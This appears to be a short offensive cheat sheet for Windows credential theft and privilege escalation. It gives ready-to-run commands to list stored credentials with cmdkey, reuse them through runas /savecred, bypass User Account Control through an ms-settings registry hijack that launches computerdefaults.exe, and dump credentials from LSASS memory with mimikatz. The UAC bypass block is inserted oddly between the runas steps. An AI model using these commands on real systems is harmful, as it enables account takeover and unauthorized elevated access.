
# Open Stored Usernames and Passwords 

- This command opens up an older version or legacy version of Credential Manager.

```cmd
rundll32 keymgr.dll,KRShowKeyMgr
```

# Enumerating Credentials

## Enumerating Credentials using `cmdkey`

#### 1. Enumerate User Credentials

```cmd
cmdkey /list
```

Stored credentials are listed with the following format:

| Key         | Value                                                                                                                                                      |
| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Target      | The resource or account name the credential is for. This could be a computer, domain name, or a special identifier.                                        |
| Type        | The kind of credential. Common types are `Generic` for general credentials, and `Domain Password` for domain user logons.                                  |
| User        | The user account associated with the credential.                                                                                                           |
| Persistence | Some credentials indicate whether a credential is saved persistently on the computer; credentials marked with `Local machine persistence` survive reboots. |
#### 2. Impersonate as User

Lets say we get an interactive type of credential so we can use `runas` to impersonate as the stored user.

#### UAC Bypass Payload

- This command sequence performs a **User Account Control (UAC) bypass** on Windows to launch an elevated command prompt (`cmd.exe`) without prompting the user. 

```bash
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
```


```cmd
runas /savecred /user:<username found in cmdkey> cmd
```

## Enumerating Credentials using `mimikatz`

#### 1. Launch `mimikatz`

```cmd
mimikatz.exe
```

#### 2. Enable `debug` Mode

```cmd
privilege::debug
```

#### 3. Launch `sekurlsa` module

- Used to dump credentials from memory of LSASS.exe

```cmd
sekurlsa::credman
```

